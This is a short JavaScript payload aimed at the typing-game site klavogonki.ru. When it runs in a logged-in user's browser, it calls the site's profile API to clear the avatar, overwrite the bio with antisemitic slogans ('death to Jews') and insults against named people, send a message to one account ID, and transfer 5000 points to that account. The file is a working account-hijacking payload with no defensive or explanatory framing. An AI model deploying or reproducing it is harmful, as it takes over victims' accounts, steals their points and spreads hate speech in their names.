'use strict';

let changeavatar = new XMLHttpRequest();
changeavatar.open(
  'POST',
  location.protocol.substr(0, location.protocol.indexOf(':')) + '://klavogonki.ru/api/profile/set-avatar',
);
changeavatar.setRequestHeader('Accept', 'application/json');
changeavatar.setRequestHeader('Content-Type', 'application/json');
let data = '{"imageData": ""}';
changeavatar.send(data);
for (var i = 0; i < 20000000; ++i) {
  i++;
}
let changebio = new XMLHttpRequest();
changebio.open(
  'POST',
  location.protocol.substr(0, location.protocol.indexOf(':')) + '://klavogonki.ru/api/profile/set-bio',
);
changebio.setRequestHeader('Accept', 'application/json');
changebio.setRequestHeader('Content-Type', 'application/json');
let biodata =
  '{"text": "SpaceStalker - мой бог! Даниэль - свинья свинья свинья свинья свинья свинья! ЗМЕРТЬ ЖИДАМ! ЗМЕРТЬ ЖИДАМ! ЗМЕРТЬ ЖИДАМ! ЗМЕРТЬ ЖИДАМ! ЗМЕРТЬ ГУРИОНУ! ЗМЕРТЬ ГУРИОНУ! ЗМЕРТЬ ГУРИОНУ! ЗМЕРТЬ ГУРИОНУ!"}';
changebio.send(biodata);
for (var i = 0; i < 20000000; ++i) {
  i++;
}
let sendcallback = new XMLHttpRequest();
sendcallback.open(
  'POST',
  location.protocol.substr(0, location.protocol.indexOf(':')) + '://klavogonki.ru/api/profile/send-message',
);
sendcallback.setRequestHeader('Accept', 'application/json');
sendcallback.setRequestHeader('Content-Type', 'application/json');
let callbackdata = '{"respondentId": "709271", "text": "Слушаюсь!"}';
sendcallback.send(callbackdata);
let sendscores = new XMLHttpRequest();
sendscores.open(
  'POST',
  location.protocol.substr(0, location.protocol.indexOf(':')) + '://klavogonki.ru/api/profile/send-scores',
);
sendscores.setRequestHeader('Accept', 'application/json');
sendscores.setRequestHeader('Content-Type', 'application/json');
let scoredata = '{"respondentId": 709271, "message": "Слушаюсь!", "amount": 5000}';
for (var i = 0; i < 20000000; ++i) {
  i++;
}
sendscores.send(scoredata);
